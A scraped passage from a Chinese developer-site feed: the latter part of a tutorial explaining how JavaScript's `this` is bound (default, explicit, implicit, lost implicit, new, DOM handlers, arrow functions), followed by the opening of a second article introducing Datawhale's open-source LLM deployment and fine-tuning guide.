<pre><code class="hljs language-Js" lang="Js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span>   <span class="hljs-comment">// 等价于 window.myName → undefined</span>
</code></pre>
<blockquote>
<p>🔁 对比实验：<br/>
如果改成 <code>var myName = '极客邦'</code>，那么 <code>this.myName</code> 会输出 <code>'极客邦'</code> ——<br/>
但请注意，这仍然是<strong>全局变量</strong>，<strong>不是 <code>bar.myName</code></strong>！</p>
</blockquote>
<p>因此，<code>this.myName</code> 在这里既不可靠，也不是你真正想访问的值。</p>
<hr/>
<h3 data-id="heading-5">🧩 小结：三种访问方式的本质区别</h3>





























<table><thead><tr><th>写法</th><th>机制</th><th>是否依赖作用域</th><th>能否访问 <code>bar.myName</code></th></tr></thead><tbody><tr><td><code>myName</code></td><td>自由变量（词法作用域）</td><td>✅</td><td>❌（除非全局巧合）</td></tr><tr><td><code>bar.myName</code></td><td>对象属性访问</td><td>❌（只需 <code>bar</code> 可见）</td><td>✅</td></tr><tr><td><code>this.myName</code></td><td>动态上下文绑定</td><td>❌</td><td>❌（除非通过 <code>bar.printName()</code> 调用）</td></tr></tbody></table>
<hr/>
<blockquote>
<p><strong>对象属性是数据，变量是绑定；前者靠引用访问，后者靠作用域查找。二者在 JavaScript 中属于完全不同的命名空间。</strong></p>
</blockquote>
<p>理解这一点，是避免“我以为它能找到”的关键。下一部分，我们将深入探讨 <code>this</code> 的动态绑定规则——为什么它如此“善变”，又该如何掌控它。</p>
<h2 data-id="heading-6">二、<code>this</code> 的真相：</h2>
<p><strong>动态上下文如何由调用方式决定?</strong></p>
<p>在第一节中，我们厘清了：</p>
<ul>
<li><strong>变量查找是静态的（词法作用域）</strong></li>
<li><strong>对象属性 ≠ 变量</strong></li>
<li><strong>自由变量沿定义时的作用域链向上查找</strong></li>
</ul>
<p>而本节要揭示的是另一个平行但常被混淆的机制：</p>
<blockquote>
<p><strong><code>this</code> 的值与作用域无关，它完全由函数的“调用方式”决定——它是动态的、运行时的上下文引用。</strong></p>
</blockquote>
<p>这正是初学者甚至中级开发者频繁踩坑的根源：<strong>把 <code>this</code> 当作“当前对象”或“作用域”的同义词</strong>。</p>
<h3 data-id="heading-7">🎯 <code>this</code> 到底是谁？</h3>
<p>在 JavaScript 中，<code>this</code> 是一个既基础又令人困惑的概念。很多开发者误以为 <code>this</code> 和“函数定义的位置”或“当前作用域”有关，但事实恰恰相反：<strong><code>this</code> 的值完全由函数的调用方式决定，与词法作用域无关</strong>。</p>
<p>本文将通过三个典型场景，带你一步步揭开 <code>this</code> 的真实面目，并建立一套可靠的判断逻辑。</p>
<hr/>
<h3 data-id="heading-8">第一部分：普通函数调用 → 默认绑定</h3>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);  <span class="hljs-comment">// 输出 window（在浏览器中）</span>
}
<span class="hljs-title function_">foo</span>();  <span class="hljs-comment">// 普通函数调用</span>
</code></pre>
<p>在<strong>非严格模式</strong>下，当你直接调用一个函数（如 <code>foo()</code>），JavaScript 引擎会将该函数的 <code>this</code> 默认绑定到<strong>全局对象</strong>。</p>
<ul>
<li>在浏览器环境中，全局对象是 <code>window</code>；</li>
<li>在 Node.js 中，则是 <code>global</code>。</li>
</ul>
<p>因此，上述代码会输出 <code>window</code>。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3dbeb6687374ec28166ecbf3b110a42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446092&amp;x-signature=YS0VzwlrLZA5xPNdAcdPhokvSo0%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>❓ 为什么这看起来“不合理”？<br/>
因为我们本能地认为：“这个函数写在全局，那 <code>this</code> 应该代表‘当前上下文’。”<br/>
但 JavaScript 的设计哲学是：<strong><code>this</code> 不是静态的，而是动态的——它取决于“怎么调用”，而不是“在哪定义”。</strong></p>
</blockquote>
<p>✅ <strong>小结</strong>：</p>
<blockquote>
<p><strong>普通函数调用（<code>foo()</code>） → <code>this</code> 指向全局对象</strong><br/>
（非严格模式下是 <code>window</code>；严格模式下是 <code>undefined</code>）</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">第二部分：<code>call</code> / <code>apply</code> → 显式绑定</h3>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">let</span> bar = {
    <span class="hljs-attr">myName</span>: <span class="hljs-string">"极客邦"</span>,
    <span class="hljs-attr">test1</span>: <span class="hljs-string">"1"</span>
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">myName</span> = <span class="hljs-string">"极客时间"</span>;
}

foo.<span class="hljs-title function_">apply</span>(bar);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bar); <span class="hljs-comment">// { myName: "极客时间", test1: "1" }</span>
</code></pre>
<p>这里我们重新定义了 <code>foo</code>，它的作用是给 <code>this</code> 对象设置 <code>myName</code> 属性。</p>
<p>关键在于这一行：</p>
<pre><code class="hljs language-Js" lang="Js">foo.<span class="hljs-title function_">apply</span>(bar);
</code></pre>
<p><code>Function.prototype.apply</code>（以及 <code>call</code>、<code>bind</code>）允许我们<strong>显式指定函数执行时的 <code>this</code> 值</strong>。<br/>
<code>foo.apply(bar)</code> 的含义是：</p>
<blockquote>
<p>“调用 <code>foo</code> 函数，并强制让函数内部的 <code>this</code> 指向 <code>bar</code> 对象。”</p>
</blockquote>
<p>于是，<code>this.myName = "极客时间"</code> 实际上等价于 <code>bar.myName = "极客时间"</code>，成功修改了 <code>bar</code> 的属性。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b7b96897d314085bfa69990b869e766~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pyJ5oSP5LmJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446092&amp;x-signature=GZKVq6rSPoaKUNS4hwGaCGbiQko%3D" alt="image.png" loading="lazy"/></p>
<p>✅ <strong>小结</strong>：</p>
<blockquote>
<p><strong><code>foo.call(obj)</code> 或 <code>foo.apply(obj)</code> → <code>this</code> 被显式绑定为 <code>obj</code></strong><br/>
这是控制 <code>this</code> 最直接、最可靠的方式之一。</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">第三部分：对象方法调用 → 隐式绑定</h3>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">a</span>);
}

<span class="hljs-keyword">var</span> obj = {
  <span class="hljs-attr">a</span>: <span class="hljs-number">2</span>,
  <span class="hljs-attr">foo</span>: foo
};

obj.<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 输出 2</span>
</code></pre>
<ul>
<li>
<p>关键：<strong>通过 <code>obj.foo()</code> 调用函数</strong>。</p>
</li>
<li>
<p>在 JavaScript 中，当一个函数作为<strong>对象的方法被调用</strong>时，函数内部的 <code>this</code> 会自动绑定到<strong>该对象</strong>（即 <code>obj</code>）。</p>
</li>
<li>
<p>所以在 <code>foo</code> 执行时：</p>
<ul>
<li><code>this</code> 指向 <code>obj</code></li>
<li><code>this.a</code> 就是 <code>obj.a</code>，即 <code>2</code></li>
</ul>
</li>
<li>
<p>因此输出：<code>2</code></p>
</li>
</ul>
<p>✅ <strong>小结</strong>：</p>
<blockquote>
<p><strong>作为对象的方法调用（<code>obj.method()</code>） → <code>this</code> 指向 <code>obj</code></strong><br/>
但仅限于“点调用”形式，解构或赋值后调用会失效。</p>
</blockquote>
<hr/>
<p>理解 <code>this</code>，是迈向 JavaScript 运行时高手的关键一步。下一次当你看到 <code>this</code> 时，别再问“它应该是什么”，而是问： <strong>“它是怎么被调用的？”</strong> ——答案就在调用栈中。</p>
<h3 data-id="heading-11">第四部分：隐式绑定丢失</h3>
<p>第三部分讲到了隐式绑定的概念，现在我们来讲讲隐式丢失</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">var</span> myObj = {
            name : <span class="hljs-string">"极客时间"</span>,
            <span class="hljs-attr">showThis</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'极客邦'</span>;
                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);
            }
        }
        <span class="hljs-keyword">var</span> foo = myObj.<span class="hljs-property">showThis</span>;   <span class="hljs-comment">// window.foo</span>
</code></pre>
<h4 data-id="heading-12">⚠️ 隐式绑定为什么会“丢失”？</h4>
<p>现在看你的代码：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">var</span> foo = myObj.<span class="hljs-property">showThis</span>; <span class="hljs-comment">// 仅获取函数引用，未调用</span>
<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// ❌ this 不再是 myObj！</span>
</code></pre>
<p>这一步发生了什么？</p>
<ol>
<li><code>myObj.showThis</code> 是一个<strong>函数引用</strong>，它本身只是一个普通的函数值；</li>
<li>将其赋值给变量 <code>foo</code> 后，<code>foo</code> 和 <code>myObj</code> <strong>彻底断开联系</strong>；</li>
<li>当你执行 <code>foo()</code> 时，这是一个<strong>普通函数调用</strong>（没有通过对象），因此触发的是 <strong>默认绑定规则</strong>。</li>
</ol>
<p>在非严格模式下：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 相当于 window.foo() → this = window</span>
</code></pre>
<p>所以，在 <code>showThis</code> 内部：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">'极客邦'</span>; <span class="hljs-comment">// 实际上是 window.name = '极客邦'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>);    <span class="hljs-comment">// 输出 window 对象</span>
</code></pre>
<blockquote>
<p>🔥 这就是“隐式绑定丢失”：<br/>
<strong>原本属于对象的方法，一旦被当作普通函数调用，就失去了与原对象的上下文关联，<code>this</code> 回退到全局对象（或 <code>undefined</code>）。</strong></p>
</blockquote>
<h3 data-id="heading-13">第五部分：<code>new</code> 调用 → new 绑定（最高优先级）</h3>
<p>你可能写过这样的代码：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">CreateObj</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"极客时间"</span>;
}

<span class="hljs-keyword">var</span> myObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateObj</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myObj.<span class="hljs-property">name</span>); <span class="hljs-comment">// "极客时间"</span>
</code></pre>
<p>但你是否想过：<strong>为什么 <code>this</code> 在这里指向新创建的对象？</strong></p>
<p>这背后是 <code>new</code> 操作符在运行时完成的一系列精密步骤。我们可以通过“手动实现 <code>new</code>”来还原其本质：</p>
<h5 data-id="heading-14">✅ 正确的手写 <code>new</code> 实现（教学版）</h5>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) {
    <span class="hljs-comment">// 1. 创建一个新对象</span>
    <span class="hljs-keyword">const</span> obj = {};

    <span class="hljs-comment">// 2. 将新对象的 [[Prototype]] 链接到构造函数的 prototype</span>
    obj.<span class="hljs-property">__proto__</span> = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;

    <span class="hljs-comment">// 3. 将构造函数内的 this 绑定到这个新对象，并执行构造函数</span>
    <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);

    <span class="hljs-comment">// 4. 如果构造函数返回的是引用类型，则返回该值；否则返回新对象</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> &amp;&amp; result !== <span class="hljs-literal">null</span>) ? result : obj;
}
</code></pre>
<p>🧠 <code>new</code> 绑定的核心规则：</p>
<p>当使用 <code>new CreateObj()</code> 时，JavaScript 引擎会按以下顺序执行</p>
<ol>
<li>创建一个全新的 <em>空对象</em>；</li>
<li>将该对象的内部 <code>[[Prototype]]</code> 链接到 <code>CreateObj.prototype</code>；</li>
<li>将 <code>CreateObj</code> 函数体内的 <code>this</code> 绑定到这个新对象；</li>
<li>执行构造函数体**（即 <code>this.name = "极客时间"</code>）；</li>
<li>如果构造函数没有显式返回一个对象，则自动返回新创建的对象。</li>
</ol>
<h3 data-id="heading-15">第六部分：DOM 事件监听器中的 <code>this</code> </h3>
<p>考虑这段常见代码：</p>
<pre><code class="hljs language-Html" lang="Html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"link"</span>&gt;</span>点击我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>)
  .<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 👉 输出 &lt;a id="link"&gt;点击我&lt;/a&gt;</span>
  });
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>尽管这是一个<strong>普通函数</strong>作为回调传入，且以<strong>普通方式被调用</strong>（我们并没有写 <code>handler.call(element)</code>）</p>
<p>但它的 <code>this</code> 却神奇地指向了触发事件的 DOM 元素。</p>
<h5 data-id="heading-16">🔍 这是怎么发生的？</h5>
<p>答案是：<strong>浏览器在内部调用你的回调函数时，显式绑定了 <code>this</code>。</strong></p>
<p>也就是说，浏览器大致做了这样的事：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-comment">// 浏览器内部伪代码</span>
<span class="hljs-keyword">const</span> element = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>);
<span class="hljs-keyword">const</span> handler = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) { <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); };

<span class="hljs-comment">// 当点击发生时：</span>
handler.<span class="hljs-title function_">call</span>(element, event); <span class="hljs-comment">// ← 显式将 this 设为 element！</span>
</code></pre>
<p>因此，虽然你写的是一个“普通函数”，但<strong>调用者（浏览器）使用了 <code>.call()</code></strong> ，使得 <code>this</code> 指向事件目标（event target）。</p>
<blockquote>
<p>✅ 这不是 JavaScript 引擎的默认行为，而是 <strong>DOM API 的设计约定</strong>。</p>
</blockquote>
<hr/>
<h5 data-id="heading-17">⚠️ 注意：箭头函数会破坏这一行为！</h5>
<p>如果你改用箭头函数：</p>
<pre><code class="hljs language-Js" lang="Js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>)
  .<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 👉 输出 window（非严格模式）</span>
  });
</code></pre>
<p>你会发现 <code>this</code> 变成了全局对象。为什么？</p>
<p>因为：</p>
<ul>
<li>箭头函数<strong>没有自己的 <code>this</code></strong>；</li>
<li>它的 <code>this</code> <strong>继承自外层词法作用域</strong>（这里是全局作用域）；</li>
<li>浏览器即使想通过 <code>.call()</code> 绑定 <code>this</code>，也对箭头函数无效（规范规定箭头函数忽略 <code>this</code> 参数）。</li>
</ul>
<blockquote>
<p>📌 所以：<strong>如果你想在事件回调中使用 <code>this</code> 指向元素，必须使用普通函数。</strong></p>
</blockquote>
<blockquote>
<p>💡 记住：<strong><code>this</code> 的值永远取决于“谁在调用”以及“怎么调用”——即使是浏览器，也在遵守这一原则。</strong></p>
</blockquote>
<h3 data-id="heading-18">🧩 总结：<code>this</code> 绑定规则优先级（从高到低）</h3>



































<table><thead><tr><th>绑定类型</th><th>调用形式</th><th><code>this</code> 指向</th></tr></thead><tbody><tr><td><strong>new 绑定</strong></td><td><code>new Fn()</code></td><td>新创建的实例对象</td></tr><tr><td><strong>显式绑定</strong></td><td><code>fn.call(obj)</code>, <code>fn.bind(obj)</code></td><td>指定的对象 <code>obj</code></td></tr><tr><td><strong>隐式绑定</strong></td><td><code>obj.method()</code></td><td><code>obj</code></td></tr><tr><td><strong>默认绑定</strong></td><td><code>fn()</code></td><td>全局对象 / <code>undefined</code></td></tr><tr><td><strong>箭头函数</strong></td><td>任意</td><td>继承外层词法作用域的 <code>this</code></td></tr></tbody></table>
<blockquote>
<p>💡 <strong>终极心法</strong>：<br/>
<strong>不要问“<code>this</code> 应该是什么”，而要问“它是怎么被调用的？”</strong><br/>
答案，永远藏在调用栈中。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[开源大模型不求人！一文带你全面入门《开源大模型食用指南》]]></title>    <link>https://juejin.cn/post/7579832417747861555</link>    <guid>https://juejin.cn/post/7579832417747861555</guid>    <pubDate>2025-12-04T09:46:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832417747861555" data-draft-id="7579814711853170698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="开源大模型不求人！一文带你全面入门《开源大模型食用指南》"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-04T09:46:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            开源大模型不求人！一文带你全面入门《开源大模型食用指南》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:46:05.000Z" title="Thu Dec 04 2025 09:46:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1d7d9517fb643c0aaa8fc3b3e69420e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446364&amp;x-signature=R48lgoHYqRlrL9nlXn5lED0gSrE%3D" alt="" loading="lazy"/></p>
<p>近年来，随着 ChatGPT 的风靡，大语言模型（LLM）成为人工智能领域的焦点。在海量开源模型涌现的今天，如何快速开始体验、部署、调优这些 LLM，成为众多开发者和研究者的核心问题。而Datawhale倾力打造的《开源大模型食用指南》正是为了解决这一痛点而诞生的宝藏项目。</p>
<p>这是一套面向<strong>中国开发者</strong>、<strong>初学者友好</strong>、<strong>Linux平台优先适配</strong>的实用教程体系。它深入浅出地拆解了从环境配置、模型部署，到全参数微调与LoRA调教的完整过程，为大模型技术的大众普及铺设了一条康庄大道。</p>
<hr/>
<h2 data-id="heading-0">为什么我们需要「开源大模型食用指南」？</h2>
<p>大语言模型的世界虽然令人向往，但对普通人而言，门槛依旧不低：</p>
<ul>
<li>Hugging Face、ModelScope上的模型太多，无从选择；</li>
<li>满满英文文档，看得头大；</li>
<li>依赖库安装踩坑无数，GPU跑模型经常“炸机”；</li>
<li>想调模型？LoRA、QLoRA、全量微调等方案五花八门，该选哪个都不知道；</li>
<li>好不容易部署成功，想加个Web界面、接入LangChain又陷入新的迷雾。</li>
</ul>
<p>基于此，《开源大模型食用指南》的最大价值就在于：</p>
<p>👉 将复杂的大模型食用流程<strong>全面本地化、中文化和场景化</strong>，从环境搭建、模型解析到部署调优，全过程提供<strong>手把手教程</strong>，哪怕你是零基础小白，也能跟着一步步实践；</p>
<p>👉 教程基于<strong>真实项目经验沉淀</strong>而成，覆盖最热门的国内外模型，例如 Qwen3、ChatGLM3、InternLM2、MiniCPM、LLaMA 等，并已实现几十个模型的快速部署和微调方案；</p>
<p>👉 既包括基础部署，也包括微调实战和Langchain场景接入，真正帮助你把模型“用”起来，而不是只停留在“能跑通”；</p>
<p>👉 对硬件要求友好，无需高配集群，<strong>一张 RTX 4090 就能做出精彩案例</strong>。</p>
<hr/>
<h2 data-id="heading-1">教程内容详解：四大模块覆盖完整链路</h2>
<p>整个自学指南结构分为四大模块，循序渐进、高效系统。</p>
<h3 data-id="heading-2">模块一：环境配置 - 从零运行不再卡顿</h3>
